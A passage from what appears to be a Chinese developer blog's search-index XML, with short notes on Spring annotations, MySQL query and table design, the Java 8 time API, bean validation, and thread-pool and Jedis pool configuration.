组件，没有明确的角色</p></li><li><p>@Service 在业务逻辑层使用（service层）</p></li><li><p>@Repository 在数据访问层使用（dao层）</p></li><li><p>@Controller 在展现层使用，控制器的声明（C）</p></li></ul><h3 id="注入bean的注解"><a href="#注入bean的注解" class="headerlink" title="注入bean的注解"></a>注入bean的注解</h3><ul><li><p>@Autowired：由Spring提供，推荐使用，一般来说很难把 Spring 换掉</p></li><li><p>@Inject：由JSR-330提供</p></li><li><p>@Resource：由JSR-250提供</p></li></ul><h3 id="配置相关"><a href="#配置相关" class="headerlink" title="配置相关"></a>配置相关</h3><ul><li>@Configuration 声明当前类为配置类，相当于xml形式的Spring配置（类上）,在 Spring 内部为 full configuration 加载，会继续加载声明在内部的 @Bean 注解</li><li>@Bean 注解在方法上，声明当前方法的返回值为一个bean，Spring 内部只会加载这个注解的类本身，内部不会继续加载</li><li>@ComponentScan 包扫描，扫描指定路径下的 bean</li><li>@WishlyConfiguration 为@Configuration与@ComponentScan的组合注解</li></ul><h3 id="Bean-相关"><a href="#Bean-相关" class="headerlink" title="@Bean 相关"></a>@Bean 相关</h3><ul><li>@Scope 设置Spring容器如何新建Bean实例</li><li>@PostConstruct Bean的初始话方法</li><li>@PreDestory 销毁</li></ul><p>scope 列表：</p><ul><li>Singleton （单例,一个Spring容器中只有一个bean实例，默认模式）</li><li>Protetype （每次调用新建一个bean）</li><li>Request （web项目中，给每个http request新建一个bean）</li><li>Session （web项目中，给每个http session新建一个bean）</li><li>GlobalSession（给每一个 global http session新建一个Bean实例）</li></ul><h3 id="Value注解"><a href="#Value注解" class="headerlink" title="@Value注解"></a>@Value注解</h3><p>支持 EL 表达式的属性注入</p><p>@Value(“${server.port}”)<br>private long port;</p><h3 id="加载配置类"><a href="#加载配置类" class="headerlink" title="加载配置类"></a>加载配置类</h3><ul><li>@PropertySource</li></ul><h3 id="上下文切换"><a href="#上下文切换" class="headerlink" title="上下文切换"></a>上下文切换</h3><ul><li>@Profile 通过设定Environment的ActiveProfiles来设定当前context需要使用的配置环境。（类或方法上）,Profile 支持多个</li><li>@Conditional Spring4中可以使用此注解定义条件话的bean，通过实现Condition接口，并重写matches方法，从而决定该bean是否被实例化。（方法上）</li></ul><h3 id="异步相关"><a href="#异步相关" class="headerlink" title="异步相关"></a>异步相关</h3><ul><li>@EnableAsync 配置类中，通过此注解开启对异步任务的支持</li><li>@Async 在实际执行的bean方法使用该注解来申明其是一个异步任务</li></ul><h3 id="定时任务相关"><a href="#定时任务相关" class="headerlink" title="定时任务相关"></a>定时任务相关</h3><ul><li>@EnableScheduling 在配置类上使用，开启计划任务的支持</li><li>@Scheduled 来申明这是一个任务，包括cron,fixDelay,fixRate等类型（方法上，需先开启计划任务的支持）</li></ul><h3 id="Enable-相关"><a href="#Enable-相关" class="headerlink" title="@Enable 相关"></a>@Enable 相关</h3><ul><li>@EnableAspectJAutoProxy 开启对AspectJ自动代理的支持</li><li>@EnableAsync 开启异步方法的支持</li><li>@EnableScheduling 开启计划任务的支持</li><li>@EnableWebMvc 开启Web MVC的配置支持</li><li>@EnableConfigurationProperties 开启对@ConfigurationProperties注解配置Bean的支持</li><li>@EnableJpaRepositories 开启对SpringData JPA Repository的支持</li><li>@EnableTransactionManagement 开启注解式事务的支持</li><li>@EnableCaching 开启注解式的缓存支持</li></ul><h3 id="Spring-mvc"><a href="#Spring-mvc" class="headerlink" title="Spring mvc"></a>Spring mvc</h3><ul><li>@EnableWebMvc 在配置类中开启Web MVC的配置支持，如一些ViewResolver或者MessageConverter等，若无此句，重写WebMvcConfigurerAdapter方法（用于对SpringMVC的配置</li><li>@Controller 声明该类为SpringMVC中的Controller</li><li>@RequestMapping 用于映射Web请求，包括访问路径和参数（类或方法上）</li><li>@ResponseBody 支持将返回值放在response内，而不是一个页面，通常用户返回json数据（返回值旁或方法上）</li><li>@PathVariable 用于接收路径参数</li><li>@RestController 该注解为一个组合注解，相当于@Controller和@ResponseBody的组合</li><li>@ControllerAdvice 通过该注解，我们可以将对于控制器的全局配置放置在同一个位置</li><li>@Controller的类的方法可使用@ExceptionHandler、@InitBinder、@ModelAttribute注解到方法上</li><li>@ExceptionHandler 用于全局处理控制器里的异常</li><li>@InitBinder 用来设置WebDataBinder，WebDataBinder用来自动绑定前台请求参数到Model中，使用 RESTful API 用不到这些</li><li>@ModelAttribute 本来的作用是绑定键值对到Model里，在@ControllerAdvice中是让全局的</li></ul><h3 id="单元测试相关"><a href="#单元测试相关" class="headerlink" title="单元测试相关"></a>单元测试相关</h3><ul><li>@RunWith 运行器，Spring中通常用于对JUnit的支持</li><li>@ContextConfiguration 用来加载配置ApplicationContext，其中classes属性用来加载配置类</li></ul><h2 id="参考学习资料"><a href="#参考学习资料" class="headerlink" title="参考学习资料"></a>参考学习资料</h2><ul><li>超哥源码解析 <a href="https://study.163.com/course/courseLearn.htm?courseId=1209427892#/learn/video?lessonId=1279668587&amp;courseId=1209427892" target="_blank" rel="noopener">https://study.163.com/course/courseLearn.htm?courseId=1209427892#/learn/video?lessonId=1279668587&amp;courseId=1209427892</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 常见性能优化方法</title>
      <link href="/mysql/mysql/mysql-optimization/"/>
      <url>/mysql/mysql/mysql-optimization/</url>
      
        <content type="html"><![CDATA[<h2 id="优化子查询"><a href="#优化子查询" class="headerlink" title="优化子查询"></a>优化子查询</h2><p>子查询的性能是非常差的，可以优化为 select 子句。</p><p>优化前</p><pre><code>update clear_res set candelete=0 where resid in( select distinct resourceid from att_attentionresult where important=0);</code></pre><p>优化后</p><pre><code> update clear_res set candelete=0 where resid in(  select resourceid from (    select distinct resourceid from att_attentionresult where important=0  ) as tmp);</code></pre>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring 中 Jackson 的常用技巧</title>
      <link href="/Spring/spring/jackson/"/>
      <url>/Spring/spring/jackson/</url>
      
        <content type="html"><![CDATA[<h2 id="格式化输出时间"><a href="#格式化输出时间" class="headerlink" title="格式化输出时间"></a>格式化输出时间</h2><pre><code>@JsonFormat(pattern = &quot;yyyy-MM-dd HH:mm:ss&quot;)</code></pre>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>编程效率提升技巧</title>
      <link href="/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/effective/"/>
      <url>/%E8%81%8C%E4%B8%9A%E7%B4%A0%E8%B4%A8/profession/effective/</url>
      
        <content type="html"><![CDATA[<h2 id="调整-Mac-键盘响应速度"><a href="#调整-Mac-键盘响应速度" class="headerlink" title="调整 Mac 键盘响应速度"></a>调整 Mac 键盘响应速度</h2><p><img src="/职业素质/profession/effective/mac-keyboard-setting.png" alt=""></p><p>通过调整这几个设置，让删除、移动的速度大大提高，编程手速快速提升。</p><h2 id="自动补全左侧代码"><a href="#自动补全左侧代码" class="headerlink" title="自动补全左侧代码"></a>自动补全左侧代码</h2><p>例如 userRepository.save() 补全返回的结果</p><p>使用 alt + 两次 enter 即可实现自动补全。</p><h2 id="清除控制台"><a href="#清除控制台" class="headerlink" title="清除控制台"></a>清除控制台</h2><p>command + K</p><h2 id="可以提高效率的-IntelliJ-的快捷键"><a href="#可以提高效率的-IntelliJ-的快捷键" class="headerlink" title="可以提高效率的 IntelliJ 的快捷键"></a>可以提高效率的 IntelliJ 的快捷键</h2><p>显示最近的文件</p><p>command E</p><p>选中当前文本<br>command W</p><p>返回代码上一处<br>Command+ Alt + 左右键</p><p>查看类图</p><p>option+command+U</p>]]></content>
      
      
      <categories>
          
          <category> 职业素质 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>MySQL DML 相关</title>
      <link href="/mysql/mysql/mysql-dml/"/>
      <url>/mysql/mysql/mysql-dml/</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL-建表的一些细节"><a href="#MySQL-建表的一些细节" class="headerlink" title="MySQL 建表的一些细节"></a>MySQL 建表的一些细节</h2><pre><code>CREATE TABLE `role`  (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `readable_name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT &#39;可读名称&#39;,  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT &#39;名称&#39;,  `remark` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT &#39;备注&#39;,  `create_at` datetime NULL DEFAULT NULL,  `update_at` datetime NULL DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Compact;</code></pre><ul><li>ENGINE 使用 InnoDB</li><li>ROW_FORMAT，Compact行记录是在MySQL 5.0时被引入的，其设计目标是能高效存放数据。简单来说，如果一个页中存放的行数据越多，其性能就越高。</li><li>CHARACTER SET 为 utf8</li><li>COLLATE 排序使用 utf8_general_ci</li></ul>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Mysql 各种 join 的区别</title>
      <link href="/mysql/mysql/mysql-join/"/>
      <url>/mysql/mysql/mysql-join/</url>
      
        <content type="html"><![CDATA[<h2 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h2><pre><code>SELECT * FROM `spring-boot-boilerplate`.user,department where department.id = user.department_id;CREATE TABLE `department` (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `name` varchar(255) NOT NULL,  `pid` bigint(20) NOT NULL COMMENT &#39;parent department&#39;,  `enabled` bit(1) NOT NULL,  `createAt` datetime DEFAULT NULL,  `updateAt` datetime DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=9 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT;CREATE TABLE `user` (  `id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT &#39;ID&#39;,  `avatar_id` bigint(20) DEFAULT NULL COMMENT &#39;头像资源&#39;,  `email` varchar(255) DEFAULT NULL COMMENT &#39;邮箱&#39;,  `enabled` bit(1) DEFAULT NULL COMMENT &#39;状态&#39;,  `password` varchar(255) DEFAULT NULL COMMENT &#39;密码&#39;,  `username` varchar(255) DEFAULT NULL COMMENT &#39;用户名&#39;,  `department_id` bigint(20) DEFAULT NULL,  `phone` varchar(255) DEFAULT NULL,  `createAt` datetime DEFAULT NULL,  `updateAt` datetime DEFAULT NULL,  PRIMARY KEY (`id`) USING BTREE,  UNIQUE KEY `unique_email` (`email`) USING BTREE,  UNIQUE KEY `unique_username` (`username`) USING BTREE) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT;</code></pre><h2 id="inner-join-和自然连接"><a href="#inner-join-和自然连接" class="headerlink" title="inner join  和自然连接"></a>inner join  和自然连接</h2><pre><code>SELECT * FROM `spring-boot-boilerplate`.user,department where department.id = user.department_id;</code></pre><p>这种是自然连接，和 join、inner join 效果一样。需要两张表都有数据，结果是两张表的集。</p><h2 id="left-join"><a href="#left-join" class="headerlink" title="left join"></a>left join</h2><h2 id="right-join"><a href="#right-join" class="headerlink" title="right join"></a>right join</h2><p><img src="/mysql/mysql/mysql-join/diagram.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> mysql </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java 趟坑集合</title>
      <link href="/java/java/java-pitfalls/"/>
      <url>/java/java/java-pitfalls/</url>
      
        <content type="html"><![CDATA[<ul><li>基本数据类型的转换细节</li><li>浮点数比较精度丢失</li><li>短路运算符，后面有可能不执行</li><li>集合的 remove 操作</li><li>形参如果是一个方法会被执行</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>电商领域知识</title>
      <link href="/%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/domain/e-commerce/"/>
      <url>/%E9%A2%86%E5%9F%9F%E7%9F%A5%E8%AF%86/domain/e-commerce/</url>
      
        <content type="html"><![CDATA[<h2 id="电商数据库设计"><a href="#电商数据库设计" class="headerlink" title="电商数据库设计"></a>电商数据库设计</h2><ul><li><a href="https://cloud.tencent.com/developer/article/1164332" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1164332</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 领域知识 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>【转载】Java 时间相关数据类型</title>
      <link href="/java/java/java-time/"/>
      <url>/java/java/java-time/</url>
      
        <content type="html"><![CDATA[<h3 id="Date"><a href="#Date" class="headerlink" title="Date"></a>Date</h3><p>Java8之前java.util 包提供了 Date 类来封装当前的日期和时间，Date 类提供两个构造函数来实例化 Date 对象。</p><pre><code class="tsx"> public Date()  public Date(long date) </code></pre><p>包含时间比较，获取时间的毫秒数等方法</p><h3 id="LocalDate"><a href="#LocalDate" class="headerlink" title="LocalDate"></a>LocalDate</h3><p>Java8用LocalDate取代Date，原因是Date实在是太难用了。</p><ol><li>Date月份从0开始，一月是0，十二月是11，LocalDate月份和星期都改成了enum。</li><li>Date和SimpleDateFormatter都不是线程安全的，而LocalDate和LocalTime和最基本的String一样，是不变类型，不但线程安全，而且不能修改。</li><li>Date是一个“万能接口”，它包含日期、时间，还有毫秒数。在新的Java 8中，日期和时间被明确划分为LocalDate和LocalTime，当然，LocalDateTime才能同时包含日期和时间。<br> 取当前日期：</li></ol><pre><code class="undefined">LocalDate today = LocalDate.now(); </code></pre><p>根据年月日取日期：</p><pre><code class="undefined">LocalDate crischristmas = LocalDate.of(2018, 12, 25);</code></pre><p>根据字符串取日期：</p><pre><code class="bash">LocalDate endOfFeb = LocalDate.parse(&quot;2018-02-28&quot;); </code></pre><p>Date和LocalDate互转:</p><pre><code class="csharp">public static LocalDate dateToLocalDate(Date d) {        Instant instant = d.toInstant();        LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());        return localDateTime.toLocalDate();    }public static Date localDateToDate(LocalDate localDate) {        Instant instant = localDate.atStartOfDay().atZone( ZoneId.systemDefault()).toInstant();        return Date.from(instant);    }</code></pre><h3 id="LocalTime"><a href="#LocalTime" class="headerlink" title="LocalTime"></a>LocalTime</h3><p>LocalTime包含毫秒：</p><pre><code class="cpp">LocalTime now = LocalTime.now(); // 11:09:09.240</code></pre><p>清除毫秒：</p><pre><code class="cpp">LocalTime now = LocalTime.now().withNano(0)); // 11:09:09</code></pre><p>构造时间：</p><pre><code class="cpp">LocalTime zero = LocalTime.of(0, 0, 0); // 00:00:00//时间也是按照ISO格式识别，但可以识别以下3种格式：//12:00//12:01:02//12:01:02.345LocalTime mid = LocalTime.parse(&quot;12:00:00&quot;); // 12:00:00</code></pre><p>Date和LocalTime互转:</p><pre><code class="cpp">public static LocalTime dateToLocalTime(Date d) {        Instant instant = d.toInstant();        LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());        return localDateTime.toLocalTime();    }</code></pre><h3 id="LocalDateTime"><a href="#LocalDateTime" class="headerlink" title="LocalDateTime"></a>LocalDateTime</h3><p>LocalDateTime类是LocalDate和LocalTime的结合体，可以通过of()方法直接创建，也可以调用LocalDate的atTime()方法或LocalTime的atDate()方法将LocalDate或LocalTime合并成一个LocalDateTime：</p><pre><code class="undefined">LocalDateTime ldt1 = LocalDateTime.of(2017, Month.JANUARY, 4, 17, 23, 52);LocalDate localDate = LocalDate.of(2017, Month.JANUARY, 4);LocalTime localTime = LocalTime.of(17, 23, 52);LocalDateTime ldt2 = localDate.atTime(localTime);</code></pre><p>LocalDateTime也提供用于向LocalDate和LocalTime的转化：</p><pre><code class="undefined">LocalDate date = ldt1.toLocalDate();LocalTime time = ldt1.toLocalTime();</code></pre><p>Date和LocalDateTime互转:</p><pre><code class="csharp">public static Date localDateTimeToDate(LocalDateTime localDateTime) {        Instant instant = localDateTime.atZone(ZoneId.systemDefault()).toInstant();        return Date.from(instant);    }public static LocalDateTime dateToLocalDateTime(Date d) {        Instant instant = d.toInstant();        LocalDateTime localDateTime = LocalDateTime.ofInstant(instant, ZoneId.systemDefault());        return localDateTime;    }</code></pre><h3 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h3><p>最新JDBC映射将把数据库的日期类型和Java 8的新类型关联起来：</p><pre><code class="rust">SQL -&gt; Java--------------------------date -&gt; LocalDatetime -&gt; LocalTimetimestamp -&gt; LocalDateTime</code></pre><h3 id="Instant"><a href="#Instant" class="headerlink" title="Instant"></a>Instant</h3><p>Instant用于表示一个时间戳，可以精确到纳秒（Nano-Second）。<br> 创建方法：</p><pre><code class="undefined">Instant now = Instant.now();Instant instant = Instant.ofEpochSecond(120, 100000);</code></pre><h3 id="Duration"><a href="#Duration" class="headerlink" title="Duration"></a>Duration</h3><p>Duration的内部实现与Instant类似，也是包含两部分：seconds表示秒，nanos表示纳秒。两者的区别是Instant用于表示一个时间戳（或者说是一个时间点），而Duration表示一个时间段。可以通过Duration.between()方法创建Duration对象：</p><pre><code class="csharp">LocalDateTime from = LocalDateTime.of(2019, Month.JANUARY, 5, 10, 7, 0);    // 2017-01-05 10:07:00LocalDateTime to = LocalDateTime.of(2019, Month.FEBRUARY, 5, 10, 7, 0);     // 2017-02-05 10:07:00Duration duration = Duration.between(from, to);     // 表示从 2017-01-05 10:07:00 到 2017-02-05 10:07:00 这段时间long days = duration.toDays();              // 这段时间的总天数long hours = duration.toHours();            // 这段时间的小时数long minutes = duration.toMinutes();        // 这段时间的分钟数long seconds = duration.getSeconds();       // 这段时间的秒数long milliSeconds = duration.toMillis();    // 这段时间的毫秒数long nanoSeconds = duration.toNanos();      // 这段时间的纳秒数</code></pre><h3 id="Period"><a href="#Period" class="headerlink" title="Period"></a>Period</h3><p>Period在概念上和Duration类似，区别在于Period是以年月日来衡量一个时间段，比如2年3个月6天：</p><pre><code class="cpp">Period period = Period.of(2, 3, 6);// 2017-01-05 到 2017-02-05 这段时间Period period = Period.between(                LocalDate.of(2019, 1, 5),                LocalDate.of(2019, 2, 5));</code></pre><h3 id="时区"><a href="#时区" class="headerlink" title="时区"></a>时区</h3><p>ZoneId替换了原有的TimeZone。<br> 初始化方法：</p><pre><code class="bash">ZoneId shanghaiZoneId = ZoneId.of(&quot;Asia/Shanghai&quot;);ZoneId systemZoneId = ZoneId.systemDefault();</code></pre><p>of()方法接收一个“区域/城市”的字符串作为参数，你可以通过getAvailableZoneIds()方法获取所有合法的“区域/城市”字符串：</p><pre><code class="dart">Set&lt;String&gt; zoneIds = ZoneId.getAvailableZoneIds();</code></pre><p>对于老的时区类TimeZone，Java 8也提供了转化方法：</p><pre><code class="undefined">ZoneId oldToNewZoneId = TimeZone.getDefault().toZoneId();</code></pre><h3 id="ZonedDateTime"><a href="#ZonedDateTime" class="headerlink" title="ZonedDateTime"></a>ZonedDateTime</h3><p>ZonedDateTime表示一个带时区的时间。我们就可以将一个LocalDate、LocalTime或LocalDateTime对象转化为ZonedDateTime对象：</p><pre><code class="undefined">LocalDateTime localDateTime = LocalDateTime.now();ZonedDateTime zonedDateTime = ZonedDateTime.of(localDateTime, shanghaiZoneId);</code></pre><p>另一种表示时区的方式是使用ZoneOffset，它是以当前时间和世界标准时间（UTC）/格林威治时间（GMT）的偏差来计算，例如：</p><pre><code class="bash">ZoneOffset zoneOffset = ZoneOffset.of(&quot;+09:00&quot;);LocalDateTime localDateTime = LocalDateTime.now();OffsetDateTime offsetDateTime = OffsetDateTime.of(localDateTime, zoneOffset);</code></pre><h3 id="日期的操作和格式化"><a href="#日期的操作和格式化" class="headerlink" title="日期的操作和格式化"></a>日期的操作和格式化</h3><h4 id="增加和减少日期"><a href="#增加和减少日期" class="headerlink" title="增加和减少日期"></a>增加和减少日期</h4><pre><code class="dart">LocalDate date = LocalDate.of(2017, 1, 5);          // 2017-01-05LocalDate date1 = date.withYear(2016);              // 修改为 2016-01-05LocalDate date2 = date.withMonth(2);                // 修改为 2017-02-05LocalDate date3 = date.withDayOfMonth(1);           // 修改为 2017-01-01LocalDate date4 = date.plusYears(1);                // 增加一年 2018-01-05LocalDate date5 = date.minusMonths(2);              // 减少两个月 2016-11-05LocalDate date6 = date.plus(5, ChronoUnit.DAYS);    // 增加5天 2017-01-10LocalDate date7 = date.with(nextOrSame(DayOfWeek.SUNDAY));      // 返回下一个距离当前时间最近的星期日LocalDate date9 = date.with(lastInMonth(DayOfWeek.SATURDAY));   // 返回本月最后一个星期六</code></pre><p>dayOfWeekInMonth    返回同一个月中每周的第几天<br> firstDayOfMonth 返回当月的第一天<br> firstDayOfNextMonth 返回下月的第一天<br> firstDayOfNextYear  返回下一年的第一天<br> firstDayOfYear  返回本年的第一天<br> firstInMonth    返回同一个月中第一个星期几<br> lastDayOfMonth  返回当月的最后一天<br> lastDayOfNextMonth  返回下月的最后一天<br> lastDayOfNextYear   返回下一年的最后一天<br> lastDayOfYear   返回本年的最后一天<br> lastInMonth 返回同一个月中最后一个星期几<br> next / previous 返回后一个/前一个给定的星期几<br> nextOrSame / previousOrSame 返回后一个/前一个给定的星期几，如果这个值满足条件，直接返回</p><h4 id="格式化日期"><a href="#格式化日期" class="headerlink" title="格式化日期"></a>格式化日期</h4><p>新的日期API中提供了一个DateTimeFormatter类用于处理日期格式化操作，它被包含在java.time.format包中，Java 8的日期类有一个format()方法用于将日期格式化为字符串，该方法接收一个DateTimeFormatter类型参数：</p><pre><code class="dart">LocalDateTime dateTime = LocalDateTime.now();String strDate1 = dateTime.format(DateTimeFormatter.BASIC_ISO_DATE);    // 20170105String strDate2 = dateTime.format(DateTimeFormatter.ISO_LOCAL_DATE);    // 2017-01-05String strDate3 = dateTime.format(DateTimeFormatter.ISO_LOCAL_TIME);    // 14:20:16.998String strDate4 = dateTime.format(DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd&quot;));   // 2017-01-05String strDate5 = dateTime.format(DateTimeFormatter.ofPattern(&quot;今天是：YYYY年 MMMM DD日 E&quot;, Locale.CHINESE)); // 今天是：2017年 一月 05日 星期四</code></pre><p>同样，日期类也支持将一个字符串解析成一个日期对象，例如：</p><pre><code class="dart">String strDate6 = &quot;2017-01-05&quot;;String strDate7 = &quot;2017-01-05 12:30:05&quot;;LocalDate date = LocalDate.parse(strDate6, DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd&quot;));LocalDateTime dateTime1 = LocalDateTime.parse(strDate7, DateTimeFormatter.ofPattern(&quot;yyyy-MM-dd HH:mm:ss&quot;));</code></pre><p>总结：</p><pre><code class="dart">Instant：时间戳Duration：持续时间，时间差LocalDate：只包含日期，比如：2016-10-20LocalTime：只包含时间，比如：23:12:10LocalDateTime：包含日期和时间，比如：2016-10-20 23:14:21Period：时间段ZoneOffset：时区偏移量，比如：+8:00ZonedDateTime/OffsetDateTime：带时区的时间</code></pre>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring Bean validation 最佳实践</title>
      <link href="/Spring/spring/spring-bean-validation/"/>
      <url>/Spring/spring/spring-bean-validation/</url>
      
        <content type="html"><![CDATA[<h2 id="Validated-和-Valid-区别"><a href="#Validated-和-Valid-区别" class="headerlink" title="@Validated 和 @Valid 区别"></a>@Validated 和 @Valid 区别</h2><ul><li><p>@Validated：用在方法入参上无法单独提供嵌套验证功能。不能用在成员属性（字段）上，也无法提示框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p></li><li><p>@Valid：用在方法入参上无法单独提供嵌套验证功能。能够用在成员属性（字段）上，提示验证框架进行嵌套验证。能配合嵌套验证注解@Valid进行嵌套验证。</p></li></ul><p>Spring Validation验证框架对参数的验证机制提供了@Validated（Spring’s JSR-303规范，是标准JSR-303的一个变种），javax提供了@Valid（标准JSR-303规范），配合BindingResult可以直接提供参数验证结果。</p><p>推荐使用 @Valid，如果需要嵌套验证也需要增加 @Valid 注解。</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>代码审查的注意事项中文版</title>
      <link href="/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips-cn/"/>
      <url>/%E6%95%8F%E6%8D%B7%E5%BC%80%E5%8F%91/agile/code-review-tips-cn/</url>
      
        <content type="html"><![CDATA[<h2 id="通用事项"><a href="#通用事项" class="headerlink" title="通用事项"></a>通用事项</h2><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><h2 id="前端"><a href="#前端" class="headerlink" title="前端"></a>前端</h2><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h2>]]></content>
      
      
      <categories>
          
          <category> 敏捷开发 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Java web 项目线上环境配置清单</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/aware-product/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/aware-product/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="Linux-VM-配置"><a href="#Linux-VM-配置" class="headerlink" title="Linux VM 配置"></a>Linux VM 配置</h2><ul><li>用户配置<ul><li>数据库</li><li>应用</li></ul></li><li>开启防火墙</li><li>开启服务器监控</li><li>确保开启日志</li><li>合理设置安全组，关闭不常用的端口<ul><li>iptables 设置</li><li>firewall 设置</li></ul></li><li>设置合理的时区</li><li>常见异常的处理</li><li>系统监控</li><li>密匙管理</li></ul><h2 id="docker-file-配置"><a href="#docker-file-配置" class="headerlink" title="docker file 配置"></a>docker file 配置</h2><ul><li>使用合理的基础镜像，减少大小 （alphine）</li></ul><h2 id="Mysql-配置"><a href="#Mysql-配置" class="headerlink" title="Mysql 配置"></a>Mysql 配置</h2><ul><li><p>开启 bin-log 复制</p></li><li><p>设置合理的时区</p></li><li><p>设置合理的字符集</p></li><li><p>设置合理的存储引擎</p></li><li><p>有合理的唯一健和索引</p></li><li><p>视情况使用的外键，高并发的场景不建议使用外键</p></li><li><p>对 UUID 采用合理的索引</p></li><li><p>考虑数据迁移的便利性</p></li></ul><h2 id="JVM-配置"><a href="#JVM-配置" class="headerlink" title="JVM 配置"></a>JVM 配置</h2><h2 id="Nginx-配置"><a href="#Nginx-配置" class="headerlink" title="Nginx 配置"></a>Nginx 配置</h2><ul><li>gzip</li><li>js 压缩和混淆</li></ul><h2 id="应用配置"><a href="#应用配置" class="headerlink" title="应用配置"></a>应用配置</h2><h3 id="Java-应用-线程池配置"><a href="#Java-应用-线程池配置" class="headerlink" title="Java 应用 线程池配置"></a>Java 应用 线程池配置</h3><p>Spring boot项目中一般会配置一个全局线程池，我们一般会使用  Executor 类型作为各种多线程的场景。</p><p>一个典型的配置如下，如果需要精细的调优，需要结合CPU数量、内存、网络 IO、应用类型等实际情况优化。</p><pre><code class="java">@Bean(&quot;taskExecutor&quot;)ThreadPoolTaskExecutor createTaskExecutor(){  ThreadPoolTaskExecutor threadPoolTaskExecutor = new ThreadPoolTaskExecutor();  // 核心线程数量为线程常驻数量，一般和 CPU 数量保持一致  threadPoolTaskExecutor.setCorePoolSize(8);  // 最大的线程数量为弹性值，往往和应用是否为计算密集还是 IO 密集有关系，可以一般设置为 CPU 数量的两倍  threadPoolTaskExecutor.setMaxPoolSize(16);  // 等待队列的大小和业务处理能力有关，根据实际情况调整  threadPoolTaskExecutor.setQueueCapacity(200);  // 说明该线程池的用途，用于日志中输出  threadPoolTaskExecutor.setThreadNamePrefix(&quot;async-task-executor&quot;);    //当线程队列满了时候的拒绝策略，这里设置为直接调用执行，也就是阻塞模式threadPoolTaskExecutor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy());  threadPoolTaskExecutor.initialize();  return threadPoolTaskExecutor;}</code></pre><h3 id="Jedis-Pool-配置"><a href="#Jedis-Pool-配置" class="headerlink" title="Jedis Pool 配置"></a>Jedis Pool 配置</h3><p>Jedis 是一个 Redis 连接客户端，在主动和哨兵模式下需要使用连接池来提高性能，Jedis 的性能受制于单次 Redis 存取的效率、并发连接数等，下面是一个典型的配置。</p><pre><code class="java">public JedisPoolConfig() {        // 最大连接数，一般取决于并发量，大多数网站来说几百的连接数已经够用         setMaxTotal(500);    // 最大空闲连接数，一定的空闲有利于性能，否则会反复创建和释放连接，如果并发量比较均匀可以设置小一点    setMaxIdle(100);    // 默认是 0 可以不设置，一般设置为 0，当没有请求时，释放全部连接    setMinIdle(0);    // 当资源池用尽后，调用者是否要等待。一般建议开启，否则会抛出错误，有回退策略的情况下可以关闭，防止雪崩效应    setBlockWhenExhausted(true);    //BlockWhenExhausted 开启后才有效，设置最大的等待时间，超出最大的时间会报错    setMaxWaitMillis(1000*60*1000);    // 向资源池借用连接时是否做连接有效性检测，无效连接会被移除，建议开启。并发量大可以关闭，会增加一次 ping    setTestOnBorrow(true);    // 向资源池归还连接时是否做连接有效性检测,无效连接会被移除，建议开启。一个机房内一般不会出现无效连接    testOnReturn(true);    // 下面几个是空闲资源监测的配置，一般可以不用配置，采用默认配置即可    // 是否开启空闲资源监测    setTestWhileIdle(true);    // 资源池中资源最小空闲时间    setMinEvictableIdleTimeMillis(60000);    // 空闲资源的检测周期    setTimeBetweenEvictionRunsMillis(30000);    // 空闲资源检测的连接数， -1 是所有连接    setNumTestsPerEvictionRun(5);}</code></pre><h3 